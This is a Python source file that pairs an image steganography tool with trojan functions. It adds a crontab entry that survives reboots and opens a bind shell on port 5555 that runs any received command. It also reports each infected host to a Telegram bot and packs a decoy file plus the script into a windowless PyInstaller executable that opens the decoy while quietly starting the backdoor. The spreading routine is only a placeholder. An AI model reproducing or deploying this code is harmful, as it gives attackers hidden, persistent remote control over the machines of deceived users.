import argparse
import os
import sys
import zlib
import random
import hashlib
import base64
import logging
import socket
import subprocess
import threading
import time
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import numpy as np
import cv2
from skimage.metrics import structural_similarity as ssim
import string
import inspect

# --- Configuration ---
PROPAGATION_COUNT_FILE = "/tmp/.propagation_count"
MAX_PROPAGATIONS = 3
BACKDOOR_PORT = 5555
SCAN_SUBNET = "192.168.1."

# --- Security Configuration ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

# --- Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Cryptography & Data Manipulation ---

def generate_key(method='fernet'):
    if method == 'fernet':
        return Fernet.generate_key()
    elif method == 'aes':
        return os.urandom(32)
    raise ValueError("Unsupported encryption method")

def encrypt_data(data, key, method='fernet'):
    if method == 'fernet':
        return Fernet(key).encrypt(data)
    elif method == 'aes':
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return iv + encryptor.update(padded_data) + encryptor.finalize()
    raise ValueError("Unsupported encryption method")

def decrypt_data(encrypted_data, key, method='fernet'):
    if method == 'fernet':
        return Fernet(key).decrypt(encrypted_data)
    elif method == 'aes':
        iv = encrypted_data[:16]
        encrypted = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(decrypted_padded) + unpadder.finalize()
    raise ValueError("Unsupported encryption method")

def compress_data(data, level=9):
    return zlib.compress(data, level)

def decompress_data(compressed_data):
    return zlib.decompress(compressed_data)

def bits_to_bytes(bits):
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

# --- Payload Generation ---

class AdvancedMorphingPayloadGenerator:
    def __init__(self, payload_length=100, junk_ratio=0.2):
        self.payload = self.generate_random_string(payload_length).encode()
        self.junk_ratio = junk_ratio

    @staticmethod
    def generate_random_string(length):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

    def insert_junk(self, data):
        junk_length = int(len(data) * self.junk_ratio)
        junk_bytes = os.urandom(junk_length)
        data_list = list(data)
        for jb in junk_bytes:
            pos = random.randint(0, len(data_list))
            data_list.insert(pos, jb)
        return bytes(data_list)

    def generate_payload(self):
        return self.insert_junk(self.payload)

# --- Steganography Core ---

def calculate_capacity(image, bits_per_channel=1):
    height, width, channels = image.shape
    return (height * width * channels * bits_per_channel) // 8

def get_edge_map(image, threshold=100):
    gray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)
    return cv2.Canny(gray, threshold, threshold * 2)

def generate_pixel_order(image_shape, seed=None):
    height, width = image_shape[:2]
    pixels = [(y, x) for y in range(height) for x in range(width)]
    if seed:
        random.seed(seed)
        random.shuffle(pixels)
    return pixels

def embed_lsb(image, data_bits, bits_per_channel, adaptive, seed):
    height, width, channels = image.shape
    if adaptive:
        edge_map = get_edge_map(image)
        pixel_order = [(y, x) for y in range(height) for x in range(width) if edge_map[y, x] > 0]
        if not pixel_order:
            raise ValueError("No edges detected for adaptive embedding")
    else:
        pixel_order = generate_pixel_order(image.shape, seed)

    bit_index = 0
    for y, x in pixel_order:
        for c in range(channels):
            pixel_value = image[y, x, c]
            for b in range(bits_per_channel):
                if bit_index < len(data_bits):
                    bit = int(data_bits[bit_index])
                    pixel_value = (pixel_value & ~(1 << b)) | (bit << b)
                    bit_index += 1
            image[y, x, c] = pixel_value
        if bit_index >= len(data_bits):
            break
    if bit_index < len(data_bits):
        raise ValueError("Image capacity insufficient for payload")
    return image

def extract_lsb(image, payload_size, bits_per_channel, adaptive, seed):
    height, width, channels = image.shape
    if adaptive:
        edge_map = get_edge_map(image)
        pixel_order = [(y, x) for y in range(height) for x in range(width) if edge_map[y, x] > 0]
    else:
        pixel_order = generate_pixel_order(image.shape, seed)

    data_bits = []
    extracted_bytes = 0
    for y, x in pixel_order:
        for c in range(channels):
            pixel_value = image[y, x, c]
            for b in range(bits_per_channel):
                bit = (pixel_value >> b) & 1
                data_bits.append(str(bit))
                if len(data_bits) % 8 == 0:
                    extracted_bytes += 1
                if extracted_bytes >= payload_size:
                    return ''.join(data_bits)
    return ''.join(data_bits)

def compute_psnr(original, stego):
    mse = np.mean((original.astype(float) - stego.astype(float)) ** 2)
    if mse == 0:
        return float('inf')
    return 20 * np.log10(255.0 / np.sqrt(mse))

def compute_ssim(original, stego):
    return ssim(original, stego, multichannel=True)

def encode_image(input_path, payload, output_path, bits, encrypt, encrypt_method, key, compress, adaptive, seed, is_file, verbose):
    try:
        image = cv2.imread(input_path, cv2.IMREAD_UNCHANGED)
        if image is None: raise ValueError("Invalid image file")
        original_image = image.copy()

        data = payload
        if is_file:
            with open(payload, 'rb') as f:
                data = f.read()
        elif isinstance(payload, str):
            data = payload.encode('utf-8')

        if compress:
            data = compress_data(data)

        if encrypt:
            if not key:
                key = generate_key(encrypt_method)
                key_str = base64.urlsafe_b64encode(key).decode('utf-8')
                print(f"Generated key (save this!): {key_str}")
            else:
                key = base64.urlsafe_b64decode(key)
            data = encrypt_data(data, key, encrypt_method)

        data_hash = hashlib.sha256(data).digest()
        full_data = len(data).to_bytes(4, 'big') + data_hash + data

        capacity = calculate_capacity(image, bits)
        if len(full_data) > capacity:
            raise ValueError(f"Payload too large")

        data_bits = ''.join(format(byte, '08b') for byte in full_data)
        stego_image = embed_lsb(image, data_bits, bits, adaptive, seed)
        cv2.imwrite(output_path, stego_image)

        if verbose:
            psnr = compute_psnr(original_image, stego_image)
            ssim_val = compute_ssim(original_image, stego_image)
            print(f"PSNR: {psnr:.2f} dB | SSIM: {ssim_val:.4f}")

    except Exception as e:
        print(f"Encoding error: {str(e)}", file=sys.stderr)
        sys.exit(1)

def decode_image(input_path, key, encrypt_method, compress, bits, adaptive, seed):
    try:
        image = cv2.imread(input_path, cv2.IMREAD_UNCHANGED)
        if image is None:
            raise ValueError("Invalid image file")

        capacity = calculate_capacity(image, bits)
        # Extract max possible to find length
        data_bits = extract_lsb(image, capacity, bits, adaptive, seed)
        full_data = bits_to_bytes(data_bits)

        length = int.from_bytes(full_data[:4], 'big')
        data_hash = full_data[4:36]
        data = full_data[36:36+length]

        if hashlib.sha256(data).digest() != data_hash:
            raise ValueError("Integrity check failed")

        if key:
            key = base64.urlsafe_b64decode(key)
            data = decrypt_data(data, key, encrypt_method)

        if compress:
            data = decompress_data(data)

        return data
    except Exception as e:
        print(f"Decoding error: {str(e)}", file=sys.stderr)
        return None

# --- Backdoor & Propagation ---

def add_persistence():
    script_path = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {script_path} --execute-backdoor\n"
    try:
        crontab = subprocess.check_output(["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        crontab = ""
    if cron_line not in crontab:
        new_crontab = crontab + cron_line
        p = subprocess.Popen(["crontab"], stdin=subprocess.PIPE, text=True)
        p.communicate(new_crontab)

def get_propagation_count():
    if not os.path.exists(PROPAGATION_COUNT_FILE): return 0
    with open(PROPAGATION_COUNT_FILE, "r") as f:
        try: return int(f.read())
        except: return 0

def update_propagation_count(count):
    with open(PROPAGATION_COUNT_FILE, "w") as f:
        f.write(str(count))

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def handle_client(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode().strip()
            if not command or command.lower() == 'exit': break
            try:
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                client_socket.send(output)
            except Exception as e:
                client_socket.send(str(e).encode())
    finally:
        client_socket.close()

def start_backdoor_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", BACKDOOR_PORT))
    server.listen(5)
    send_to_telegram(f"Backdoor activated on {socket.gethostname()}")
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

def scan_and_propagate():
    count = get_propagation_count()
    if count >= MAX_PROPAGATIONS:
        return
    # Placeholder for propagation logic
    update_propagation_count(count + 1)

def activate_backdoor():
    add_persistence()
    backdoor_thread = threading.Thread(target=start_backdoor_server, daemon=True)
    backdoor_thread.start()
    propagate_thread = threading.Thread(target=scan_and_propagate, daemon=True)
    propagate_thread.start()

# --- File Binder ---

def create_binder(legit_file, stego_image, output_exe, bits, key, encrypt_method, compress, adaptive, seed):
    try:
        with open(legit_file, "rb") as f:
            legit_data = f.read()

        with open(stego_image, "rb") as f:
            stego_data = f.read()

        with open(__file__, "r") as f:
            main_script_content = f.read()

        legit_data_b64 = base64.b64encode(legit_data).decode('utf-8')
        stego_data_b64 = base64.b64encode(stego_data).decode('utf-8')
        main_script_b64 = base64.b64encode(main_script_content.encode('utf-8')).decode('utf-8')

        decode_command = [
            sys.executable,
            "security_module_temp.py",
            "decode",
            "stego_image.png",
            "--execute",
            "--bits", str(bits),
            "--encrypt-method", encrypt_method,
        ]
        if key:
            decode_command.extend(["--key", key])
        if compress:
            decode_command.append("--compress")
        if adaptive:
            decode_command.append("--adaptive")
        if seed:
            decode_command.extend(["--seed", seed])

        binder_script_content = f"""
import os, base64, subprocess, sys

legit_data = base64.b64decode("{legit_data_b64}")
stego_data = base64.b64decode("{stego_data_b64}")
main_script_data = base64.b64decode("{main_script_b64}").decode('utf-8')

legit_filename = os.path.basename("{legit_file}")
stego_filename = "stego_image.png"
script_filename = "security_module_temp.py"

with open(legit_filename, "wb") as f:
    f.write(legit_data)

with open(stego_filename, "wb") as f:
    f.write(stego_data)

with open(script_filename, "w") as f:
    f.write(main_script_data)

if sys.platform == "win32":
    os.startfile(legit_filename)
else:
    opener = "open" if sys.platform == "darwin" else "xdg-open"
    subprocess.call([opener, legit_filename])

subprocess.Popen({repr(decode_command)})
"""

        binder_script_file = "binder_script.py"
        with open(binder_script_file, "w") as f:
            f.write(binder_script_content)

        subprocess.run(["pyinstaller", "--onefile", "--noconsole", f"--name={output_exe}", binder_script_file])

    except Exception as e:
        logging.error(f"Failed to create binder: {e}")
    finally:
        if os.path.exists("binder_script.py"): os.remove("binder_script.py")
        if os.path.exists(f"{output_exe}.spec"): os.remove(f"{output_exe}.spec")
        if os.path.exists("build"): import shutil; shutil.rmtree("build")

# --- Main CLI ---

def main():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)

    encode_parser = subparsers.add_parser("encode")
    encode_parser.add_argument("input_image")
    encode_parser.add_argument("output_image")
    encode_parser.add_argument("payload", nargs='?')
    encode_parser.add_argument("--file", action="store_true")
    encode_parser.add_argument("--generate-payload", action="store_true")
    encode_parser.add_argument("--bits", type=int, default=1)
    encode_parser.add_argument("--compress", action="store_true")
    encode_parser.add_argument("--encrypt", action="store_true")
    encode_parser.add_argument("--encrypt-method", default="fernet")
    encode_parser.add_argument("--key")
    encode_parser.add_argument("--adaptive", action="store_true")
    encode_parser.add_argument("--seed")
    encode_parser.add_argument("-v", "--verbose", action="store_true")

    decode_parser = subparsers.add_parser("decode")
    decode_parser.add_argument("input_image")
    decode_parser.add_argument("--key")
    decode_parser.add_argument("--encrypt-method", default="fernet")
    decode_parser.add_argument("--compress", action="store_true")
    decode_parser.add_argument("--output-file")
    decode_parser.add_argument("--bits", type=int, default=1)
    decode_parser.add_argument("--adaptive", action="store_true")
    decode_parser.add_argument("--seed")
    decode_parser.add_argument("--execute", action="store_true")

    subparsers.add_parser("execute-backdoor", help=argparse.SUPPRESS)

    bind_parser = subparsers.add_parser("bind")
    bind_parser.add_argument("legit_file")
    bind_parser.add_argument("stego_image")
    bind_parser.add_argument("output_exe")
    bind_parser.add_argument("--bits", type=int, default=1)
    bind_parser.add_argument("--key")
    bind_parser.add_argument("--encrypt-method", default="fernet")
    bind_parser.add_argument("--compress", action="store_true")
    bind_parser.add_argument("--adaptive", action="store_true")
    bind_parser.add_argument("--seed")

    args = parser.parse_args()

    if "verbose" in args and args.verbose:
        logging.getLogger().setLevel(logging.INFO)

    if args.command == "encode":
        payload = args.payload
        is_file = args.file
        if args.generate_payload:
            payload = AdvancedMorphingPayloadGenerator().generate_payload()
            is_file = False
        elif not payload:
            parser.error("Payload required.")

        encode_image(args.input_image, payload, args.output_image, args.bits, args.encrypt, args.encrypt_method, args.key, args.compress, args.adaptive, args.seed, is_file, args.verbose)

    elif args.command == "decode":
        extracted_data = decode_image(args.input_image, args.key, args.encrypt_method, args.compress, args.bits, args.adaptive, args.seed)
        if extracted_data is None:
            sys.exit(1)

        if args.execute:
            activate_backdoor()
        elif args.output_file:
            with open(args.output_file, 'wb') as f:
                f.write(extracted_data)
        else:
            try:
                print(extracted_data.decode('utf-8'))
            except UnicodeDecodeError:
                print(base64.b64encode(extracted_data).decode('utf-8'))

    elif args.command == "execute-backdoor":
        activate_backdoor()
        try:
            while True: time.sleep(3600)
        except KeyboardInterrupt:
            sys.exit(0)

    elif args.command == "bind":
        create_binder(args.legit_file, args.stego_image, args.output_exe, args.bits, args.key, args.encrypt_method, args.compress, args.adaptive, args.seed)

if __name__ == "__main__":
    main()